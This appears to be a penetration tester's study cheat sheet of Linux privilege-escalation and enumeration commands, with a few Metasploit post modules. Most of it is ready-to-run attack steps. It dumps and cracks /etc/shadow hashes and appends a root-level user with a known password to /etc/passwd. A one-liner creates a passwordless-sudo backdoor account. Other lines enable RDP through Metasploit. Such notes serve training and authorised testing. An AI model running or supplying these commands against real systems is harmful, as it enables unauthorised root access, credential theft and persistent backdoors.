# Enumeration ✅
## Basic-Enumeration ✅
```bash

uname -a
sudo -V
sudo -l
history

cat ~/.bashrc
cat ~/.bash_history
cat ~/.bash_profile

cat /etc/passwd

searchsploit <protocol> <version>
```
## Metasploit-Command-Enumeration ✅
```bash
set --global LHOST 10.11.99.141
run post/windows/manage/enable_rdp # open and enable windows rdp  
run post/multi/recon/local_exploit_suggester
```

# Privilege-Escalation ✅📚
## SUID_SGID_Capabilities_Files_enumeration ✅
```
getcap -r / 2>/dev/null 
find /  -perm -04000 -ls 2>/dev/null
find / -type f \( -perm -4000 -o -perm -2000 \) -exec ls -l {} \;
```
## Privilege-Escalation_enumeration ✅
```bash
id
history
sudo -V
bash --version
cat /etc/sudoers
cat /etc/crontab
uname -a (Linux kernel version)
cat /etc/issue (Linux distribution version) 
cat /etc/*-release (Linux distribution version) 
cat /proc/version (Linux kernel version)
```
## Weak File Permissions ✅
```bash
cat /etc/shadow
unshadow /etc/passwd /etc/shadow > hash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```
### Writable /etc/shadow OR /etc/passwd ✡️
```bash
mkpasswd -m sha-512 <new-password>
OR
openssl passwd <password>
OR
openssl passwd -1 -salt <username> <password>

change root password from /etc/shadow OR Add to end the /etc/passwd
Format add to /etc/passwd = <username>:<passwordhash>:0:0:root:/root:/bin/bash

echo 'mobin:$1$8VO3cUZu$als/bleGjZ3SVjE5EGzvh/:0:0:root:/root:/bin/bash' >> /etc/passwd
echo 'mobin:$6$/LuWBv7L4QbfG1kf$pb0sFxOLHKiMNiAr2vMdpRc2e8mljxoUlm33fY6KEXLzcH7K51zegdnOYygurWuP/2.KW3eQvcBHXBn9/Jqnj0:0:0:root:/root:/bin/bash' >> /etc/passwd
password=Mobin@

su <username> ( Switch to new root user )
```
### Writable /etc/sudoers ✡️
```bash
echo 'ali ALL=(ALL:ALL) NOPASSWD:ALL' >> /etc/sudoers
useradd ali && (echo -e 'Mobin@\nMobin@' | passwd ali) && (echo "ali ALL=(ALL:ALL) NOPASSWD:ALL" >> /etc/sudoers)
```
